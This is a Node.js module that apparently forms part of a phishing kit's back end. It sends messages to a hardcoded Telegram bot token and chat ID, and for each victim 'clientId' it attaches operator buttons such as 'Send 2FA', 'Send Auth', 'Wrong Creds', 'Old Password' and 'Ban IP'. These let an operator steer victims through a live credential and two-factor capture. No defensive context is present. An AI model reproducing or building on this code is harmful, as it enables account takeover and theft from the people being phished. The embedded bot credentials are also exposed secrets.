const axios = require('axios');

const TELEGRAM_TOKEN = '8386163454:AAH-FEmBv2bEFKPkz9FPZ-lM_jhXUnYgAus';
const CHAT_ID = '-1003130451792';

// Message queue for failed messages
const messageQueue = [];
const MAX_RETRIES = 3;
const RETRY_DELAY = 2000; // 2 seconds

/**
 * Retry mechanism for failed requests
 */
async function retryRequest(fn, retries = MAX_RETRIES) {
  try {
    return await fn();
  } catch (error) {
    console.error(`Request failed, retries left: ${retries}`, error.message);
    
    if (retries > 0) {
      await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
      return retryRequest(fn, retries - 1);
    }
    
    throw error;
  }
}

/**
 * Process queued messages
 */
async function processMessageQueue() {
  while (messageQueue.length > 0) {
    const { payload, clientId, buttons, retries = MAX_RETRIES } = messageQueue.shift();
    
    try {
      await retryRequest(() => 
        axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, payload, {
          timeout: 10000, // 10 second timeout
          headers: {
            'Content-Type': 'application/json'
          }
        })
      );
      console.log(`✅ Message sent successfully to Telegram`);
    } catch (error) {
      console.error(`❌ Failed to send message after ${retries} retries:`, error.message);
      
      // Re-queue message with fewer retries if we haven't exhausted all attempts
      if (retries > 1) {
        messageQueue.push({ payload, clientId, buttons, retries: retries - 1 });
        console.log(`🔄 Message re-queued, retries left: ${retries - 1}`);
      } else {
        console.error(`💥 Message permanently failed, removing from queue`);
      }
    }
  }
}

// Process message queue every 5 seconds
setInterval(processMessageQueue, 5000);

/**
 * Sends a Telegram message with optional inline buttons and retry logic.
 * @param {string} message - The message to send.
 * @param {string|null} clientId - The client ID (for callback data).
 * @param {boolean|string} buttons - true = all buttons, 'banOnly' = only Ban IP button, false = no buttons.
 */
function sendTelegramMessage(message, clientId = null, buttons = false) {
  const payload = {
    chat_id: CHAT_ID,
    text: message,
    parse_mode: 'Markdown',
  };

  if (clientId && buttons) {
    if (buttons === 'banOnly') {
      payload.reply_markup = {
        inline_keyboard: [
          [{ text: '❌ Ban IP', callback_data: `ban_ip:${clientId}` }]
        ]
      };
    } else {
      payload.reply_markup = {
        inline_keyboard: [
          [
            { text: 'Send 2FA', callback_data: `send_2fa:${clientId}` },
            { text: 'Send Auth', callback_data: `send_auth:${clientId}` },
          ],
          [
            { text: 'Send Email', callback_data: `send_email:${clientId}` },
            { text: 'Send WhatsApp', callback_data: `send_wh:${clientId}` },
          ],
          [
            { text: 'Wrong Creds', callback_data: `send_wrong_creds:${clientId}` },
            { text: 'Old Password', callback_data: `send_old_pass:${clientId}` },
          ],
          [
            { text: 'Calendar', callback_data: `send_calendar:${clientId}` },
            { text: '❌ Ban IP', callback_data: `ban_ip:${clientId}` },
          ]
        ]
      };
    }
  }

  // Add to queue for processing
  messageQueue.push({ payload, clientId, buttons });
  console.log(`📤 Message queued for Telegram (queue size: ${messageQueue.length})`);
  
  // Try immediate send, but don't block if it fails
  retryRequest(() => 
    axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, payload, {
      timeout: 10000
    })
  ).catch(error => {
    console.log(`⚠️ Immediate send failed, message will be retried via queue: ${error.message}`);
  });
}

module.exports = { sendTelegramMessage };
